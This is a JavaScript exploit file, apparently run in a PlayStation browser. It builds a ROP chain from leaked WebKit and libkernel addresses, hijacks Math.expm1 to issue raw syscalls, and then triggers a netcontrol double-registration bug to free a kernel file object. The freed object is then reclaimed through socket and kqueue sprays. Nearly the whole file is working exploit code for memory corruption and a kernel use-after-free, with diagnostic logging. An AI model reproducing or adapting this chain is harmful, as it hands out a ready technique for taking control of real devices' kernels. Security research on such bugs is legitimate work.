// ?v=16   --   aliasing chain, V5
//
// V4 -> V5:
//   * netevent() now zeroes the high dword of the arg buffer. V4 sent
//     whatever the previous call had left in that slot.
//   * New params, all default off (V4 behaviour):
//       ?rearm=1     - SET between CLEAR #1 and CLEAR #2
//       ?set2=1      - SET twice before the CLEARs
//       ?argHi=X     - hex value placed in the high dword of the arg
//       ?swap=1      - use SET=0x20000007, CLEAR=0x20000003
//   * DIAG line gains fl_set2 / rv_set2 when the extra SET runs.

import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
function post(t, d) { }

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
    / -- /, /\.\s/, /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
const SCREEN_MODE = params.get("screen") || "loud";
const SCREEN_FULL = SCREEN_MODE === "full";

const HIDE_RE = /^(WORKER-INFO|WORKER-ONERROR|FREE-RTHDR)$/;
const ONCE_RE = /^(STUBS|STUB-PROBE|BASES|PRIMITIVE-OK|PAIR-STATUS|FW$|FW-STATUS|EXPM1-RESTORED|WORKERS-PINNED|THREAD-PINNED)$/;
const seenOnce = new Set();
const N_LIMIT = { "ATTEMPT": 4 };
const seenCount = {};
const ALWAYS_RE = /FAIL|ERROR|THREW|CRASH|PANIC|UAF-ARMED|ALIAS|STEP10-|FAILED-STAGE|REBOOT-REQUIRED|ALL DONE|POST-CLEAR|DIAG|BUDGET|SUMMARY|FL-|SET-|CLEAR-|REARM/i;

function shouldShow(tag, detail) {
    if (SCREEN_FULL) return true;
    const full = tag + " " + (detail || "");
    if (ALWAYS_RE.test(full)) return true;
    if (HIDE_RE.test(tag)) return false;
    if (ONCE_RE.test(tag)) {
        if (seenOnce.has(tag)) return false;
        seenOnce.add(tag);
        return true;
    }
    if (tag in N_LIMIT) {
        seenCount[tag] = (seenCount[tag] || 0) + 1;
        return seenCount[tag] <= N_LIMIT[tag];
    }
    return true;
}

if (typeof window !== "undefined" && !window.__poopsLog) window.__poopsLog = [];

function mark(tag, detail) {
    detail = terse(detail);
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    if (window.__poopsLog) window.__poopsLog.push(line);
    post(tag, detail);
    if (!shouldShow(tag, detail)) return;
    lines.push(line);
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(l => {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
            : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
            : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED|ALIAS/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function trace(t, d) { if (VERBOSE) mark(t, d); else post(t, d); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const SYS = {
    read: 3, write: 4, close: 6, getpid: 20, getuid: 0x18,
    socket: 0x61, netcontrol: 0x63, kqueue: 0x16a,
    fcntl: 0x5c, getsockopt: 0x76, sched_yield: 0x14b,
    rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
    cpuset_getaffinity: 0x1e7, sysctl: 0xca,
};

const SWAP_OPS = params.get("swap") === "1";
const NETEVENT_SET_QUEUE = SWAP_OPS ? 0x20000007 : 0x20000003;
const NETEVENT_CLEAR_QUEUE = params.has("clear")
    ? parseInt(params.get("clear"), 16) >>> 0
    : (SWAP_OPS ? 0x20000003 : 0x20000007);
const NETEVENT_CLEAR_2 = params.has("clear2")
    ? parseInt(params.get("clear2"), 16) >>> 0
    : NETEVENT_CLEAR_QUEUE;

const AF_UNIX = 1, SOCK_STREAM = 1;
const SOL_SOCKET = 0xffff, SO_TYPE = 0x1008;
const F_GETFL = 3, F_SETFL = 4, O_NONBLOCK = 4;

const NUM_FILE_SPRAY = params.has("spray")
    ? parseInt(params.get("spray"), 10) : 512;
const NUM_ATTEMPT = params.has("attempts")
    ? parseInt(params.get("attempts"), 10) : 4;
const NUM_KQUEUE_AFTER = params.has("kq")
    ? parseInt(params.get("kq"), 10) : 128;
const SKIP_CLEAR2_IF_FREED = params.get("noSkip") !== "1";

const DO_SET2 = params.get("set2") === "1";
const DO_REARM = params.get("rearm") === "1";
const ARG_HI = params.has("argHi")
    ? (parseInt(params.get("argHi"), 16) >>> 0)
    : 0;

const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1;
const RTP_PRIO_NORMAL = 0, RTP_LOOKUP = 0;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const MAIN_CORE = params.has("core")
    ? parseInt(params.get("core"), 10) : 7;

const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;

(async function () {
    let p = null;
    try {
        const { key, off } = offsetsFor(navigator.userAgent);
        function prettyFW(ua) {
            const m = /PlayStation\s+([45])[\/ ](\d+)\.(\d+)/.exec(ua || "");
            if (!m) return "non-PS";
            return "PS" + m[1] + "-" + m[2] + "." + m[3];
        }
        mark("FW", prettyFW(navigator.userAgent));
        if (!off) { state("no offsets for this firmware", "bad"); return; }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "mode=aliasing attempts=" + NUM_ATTEMPT
            + " spray=" + NUM_FILE_SPRAY + " kq=" + NUM_KQUEUE_AFTER
            + " core=" + MAIN_CORE
            + " set=0x" + NETEVENT_SET_QUEUE.toString(16)
            + " clr1=0x" + NETEVENT_CLEAR_QUEUE.toString(16)
            + " clr2=0x" + NETEVENT_CLEAR_2.toString(16)
            + " set2=" + (DO_SET2 ? 1 : 0)
            + " rearm=" + (DO_REARM ? 1 : 0)
            + " argHi=0x" + ARG_HI.toString(16)
            + " swap=" + (SWAP_OPS ? 1 : 0)
            + " skip_clear2_if_freed=" + (SKIP_CLEAR2_IF_FREED ? 1 : 0));

        state("running the primitive...", "warn");
        await new Promise(r => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });

        installWindowP(carrier, {
            promote: true,
            onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
        });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + " stage=" + pairStatus.stage
            + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
            + (pairStatus.error ? " error=" + pairStatus.error : ""));
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);

        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase), "")) return;

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET",  off.wk_POP_R8_RET,  [null, 0x58, 0xc3]],
            ["POP_R9_RET",  off.wk_POP_R9_RET,  [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET",   off.wk_LEAVE_RET,   [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        if (!check("gadget-table-fits-module", gated === GAD.length,
            gated + "/" + GAD.length)) return;

        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o)); seeded++;
            }
        }
        const need = new Set(Object.keys(SYS).map(k => SYS[k])
            .filter(n => !stubAddr.has(n)));
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o)); need.delete(num); scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);

        const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
        if (!check("syscall-page-needs-stub", miss.length === 0,
            miss.join(","))) return;

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
                .add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;
        function callAddr(target, args) {
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return { lo: M.frameDv.getUint32(0, true),
                     hi: M.frameDv.getUint32(4, true),
                     i32: M.frameDv.getUint32(0, true) | 0 };
        }
        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }
        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0,
            "pid=" + pid + " uid=" + sc(SYS.getuid).i32);

        // ── pin main thread to MAIN_CORE ──
        const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
        keepAlive.push(prioAb, maskAb);
        const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
        const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);
        {
            const ID = new int64(0xffffffff, 0xffffffff);
            prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
            prioDv.setUint16(2, RTP, true);
            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, 1 << MAIN_CORE, true);
            const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                ID, 0x10, maskAddr).i32;
            const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            mark("THREAD-PINNED", "core=" + MAIN_CORE
                + " affinity=" + a + " rtprio=" + r);
            check("main-thread-pinned", a === 0 && r === 0,
                "core=" + MAIN_CORE + " a=" + a + " r=" + r);
        }

        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(8); keepAlive.push(lenAb);
        const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);
        const optAb = new ArrayBuffer(8); keepAlive.push(optAb);
        const optAddr = bufAddr(optAb), optDv = new DataView(optAb);

        function netevent(sock, event) {
            // Both halves are set explicitly. V4 left the high dword
            // stale, which meant the CLEAR handler could read garbage.
            argDv.setUint32(0, sock >>> 0, true);
            argDv.setUint32(4, ARG_HI, true);
            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        }
        function flGet(fd) { return sc(SYS.fcntl, fd, F_GETFL, 0).i32; }
        function flSet(fd, v) { return sc(SYS.fcntl, fd, F_SETFL, v).i32; }
        function looksLikeSocket(fd) {
            lenDv.setUint32(0, 4, true);
            optDv.setUint32(0, 0, true);
            return sc(SYS.getsockopt, fd, SOL_SOCKET, SO_TYPE,
                optAddr, lenAddr).i32 === 0;
        }

        // ── boot fingerprint (best effort) ──
        let boot = null;
        if (stubAddr.has(SYS.sysctl)) {
            const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
            keepAlive.push(nameAb, outAb);
            const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
            const nameDv = new DataView(nameAb);
            new Uint8Array(outAb).fill(0);
            nameDv.setUint32(0, 1, true);
            nameDv.setUint32(4, 21, true);
            lenDv.setUint32(0, 0x10, true);
            lenDv.setUint32(4, 0, true);
            const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
            const o = new DataView(outAb);
            const sec = o.getUint32(0, true);
            if (rv === 0 && sec !== 0)
                boot = sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
            mark("BOOT", boot || ("rv=" + rv + " errno=" + errno()));
        }

        // ═══════════════════════════════════════════════════════════════
        //  ALIASING CHAIN
        // ═══════════════════════════════════════════════════════════════
        let result = null;
        let attemptsRun = 0;
        const attemptLog = [];

        for (let attempt = 1; attempt <= NUM_ATTEMPT && !result; ++attempt) {
            attemptsRun = attempt;
            state("attempt " + attempt + "/" + NUM_ATTEMPT + "...", "warn");

            // ── 1. dummy socket ──
            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (dummy === -1) {
                mark("ATTEMPT-SKIP", "socket failed errno=" + errno());
                continue;
            }
            const flPre = flGet(dummy);
            const socPre = looksLikeSocket(dummy);
            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT
                + " dummy=" + dummy
                + " fl_pre=" + flPre
                + " is_socket_pre=" + socPre);

            // ── 2. SET_QUEUE #1 ── (registra la entrada en la cola)
            const reg1 = netevent(dummy, NETEVENT_SET_QUEUE);
            const flPostSet1 = flGet(dummy);
            mark("SET-1", "fd=" + dummy
                 + " op=0x" + NETEVENT_SET_QUEUE.toString(16)
                 + " rv=" + reg1.rv
                 + (reg1.rv === -1 ? " errno=" + reg1.err : "")
                 + " fl_post=" + flPostSet1);

            if (reg1.rv !== 0) {
                mark("ATTEMPT-SKIP", "SET1 rv=" + reg1.rv + " errno=" + reg1.err);
                sc(SYS.close, dummy);
                continue;
            }

            // ── 3. SET_QUEUE #2 ── (duplicate path → fdrop indebido → file liberado)
            const reg2 = netevent(dummy, NETEVENT_SET_QUEUE);
            const flPostSet2 = flGet(dummy);
            mark("SET-2", "fd=" + dummy
                 + " op=0x" + NETEVENT_SET_QUEUE.toString(16)
                 + " rv=" + reg2.rv
                 + (reg2.rv === -1 ? " errno=" + reg2.err : "")
                 + " fl_post=" + flPostSet2);
            // Diagnóstico: drenar la cola y ver cuántos CLEARs hacen falta
            for (let i = 0; i < 4; ++i) {
                const clr = netevent(dummy, NETEVENT_CLEAR_QUEUE);
                const flClr = flGet(dummy);
                mark("DRAIN-" + i, "rv=" + clr.rv
                    + (clr.rv === -1 ? " errno=" + clr.err : "")
                    + " fl_post=" + flClr);
                if (clr.rv === -1) break;
            }
            const flEnd = flGet(dummy);
            mark("DRAIN-END", "fl=" + flEnd);

            // El bug sólo se dispara si SET2 devuelve -1/EIO
            if (!(reg2.rv === -1 && reg2.err === 5)) {
                mark("ATTEMPT-SKIP", "SET2 no dup rv=" + reg2.rv + " errno=" + reg2.err);
                sc(SYS.close, dummy);
                continue;
            }
            mark("OVERDROP-ARMED", "fd=" + dummy + " via=second-set errno=5");

            const uafSock = dummy;
            committed = true;

            // ── 4. POST-SET2 state of uafSock ──
            const socAfter = looksLikeSocket(uafSock);
            const flAfter = flGet(uafSock);
            mark("POST-SET2", "uafSock=" + uafSock
                + " fl=" + flAfter
                + " is_socket=" + socAfter
                + " set1_rv=" + reg1.rv
                + " set2_rv=" + reg2.rv
                + " set2_errno=" + reg2.err);

            // ── 5. file_zone spray via socket(AF_UNIX) ──
            const sprayFds = [];
            for (let i = 0; i < NUM_FILE_SPRAY; ++i) {
                const s = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (s === -1) break;
                sprayFds.push(s);
            }
            mark("FILE-SPRAY", "n=" + sprayFds.length
                + " first=" + (sprayFds[0] || "-")
                + " last=" + (sprayFds[sprayFds.length - 1] || "-"));

            // ── 6. alias detection (bidirectional) ──
            let partner = 0, dirA = 0, dirB = 0, tested = 0;
            let lastSample = "";
            for (const s of sprayFds) {
                const cfl = flGet(s);
                if (cfl < 0) continue;
                tested++;

                flSet(s, (cfl & ~O_NONBLOCK) | O_NONBLOCK);
                const a = flGet(uafSock);
                flSet(s, cfl);
                if (a >= 0 && (a & O_NONBLOCK) !== 0) {
                    partner = s; dirA++; break;
                }

                const ufl = flGet(uafSock);
                if (ufl < 0) continue;
                flSet(uafSock, (ufl & ~O_NONBLOCK) | O_NONBLOCK);
                const b = flGet(s);
                flSet(uafSock, ufl);
                if (b >= 0 && (b & O_NONBLOCK) !== 0) {
                    partner = s; dirB++; break;
                }

                if (tested <= 4) {
                    lastSample += " [" + s + ":" + cfl + "]";
                }
            }
            mark("ALIAS-PROBE", "tested=" + tested
                + " dirA=" + dirA + " dirB=" + dirB
                + " sample=" + lastSample.trim());

            const uafFl = flGet(uafSock);
            const uafSoc = looksLikeSocket(uafSock);
            const line = "attempt=" + attempt
                + " dummy=" + uafSock
                + " fl_pre=" + flPre
                + " fl_set1=" + flPostSet1
                + " fl_set2=" + flPostSet2
                + " fl_end=" + uafFl
                + " soc_end=" + uafSoc
                + " tested=" + tested
                + " partner=" + (partner || "-");
            attemptLog.push(line);
            mark("DIAG", line);

            if (!partner) {
                mark("ATTEMPT-RETRY", "after=no-alias next=" + (attempt + 1));
            // Drenar la cola antes del siguiente intento
            for (let i = 0; i < 4; ++i) {
                const dr = netevent(dummy, NETEVENT_CLEAR_QUEUE);
                if (dr.rv === -1) break;
            }                
                for (const s of sprayFds) sc(SYS.close, s);
                sc(SYS.close, uafSock);
                continue;
            }
            mark("ALIAS", "uafSock=" + uafSock + " partner=" + partner
                + " n=" + sprayFds.length);

            try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
            catch (e) { }

            result = { uafSock: uafSock, partner: partner, sprayFds: sprayFds };
        }

        // ── end-of-run summary ──
        mark("SUMMARY", "attempts=" + attemptsRun + "/" + NUM_ATTEMPT
            + " got_alias=" + (!!result));
        for (const l of attemptLog) mark("BUDGET", l);

        check("file-zone-reclaim-by-socket-spray", !!result,
            result ? "uafSock=" + result.uafSock + " partner=" + result.partner : "");

        if (result) {
            for (const s of result.sprayFds) {
                if (s !== result.partner) sc(SYS.close, s);
            }
            const before = looksLikeSocket(result.uafSock);
            const flBefore = flGet(result.uafSock);
            mark("BEFORE-CLOSE", "uafSock_is_socket=" + before
                + " fl=" + flBefore);

            sc(SYS.close, result.partner);
            sc(SYS.sched_yield);

            const kqs = [];
            for (let i = 0; i < NUM_KQUEUE_AFTER; ++i) {
                const k = sc(SYS.kqueue).i32;
                if (k === -1) break;
                kqs.push(k);
            }
            mark("KQUEUE-SPRAY", "n=" + kqs.length);

            const after = looksLikeSocket(result.uafSock);
            const flAfter = flGet(result.uafSock);
            mark("AFTER-CLOSE", "uafSock_is_socket=" + after
                + " fl=" + flAfter);
            check("uafSock-reclaimed-by-non-socket", !after,
                "is_socket=" + after + " fl=" + flAfter);
            check("socket-to-kqueue-transition",
                before && !after, "before=" + before + " after=" + after);

            for (const k of kqs) sc(SYS.close, k);
            try { sc(SYS.close, result.uafSock); } catch (e) { }
        }

        state(result ? "ALIASING PRIMITIVE OK" : "no alias",
              result ? "ok" : "bad");
    } catch (e) {
        mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED -- see log", "bad");
    } finally {
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("DISARM-THREW", e.message); }
        if (rebootRequired) mark("REBOOT-REQUIRED", "reason=aliased-file-not-cleaned");
        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
    }
})();
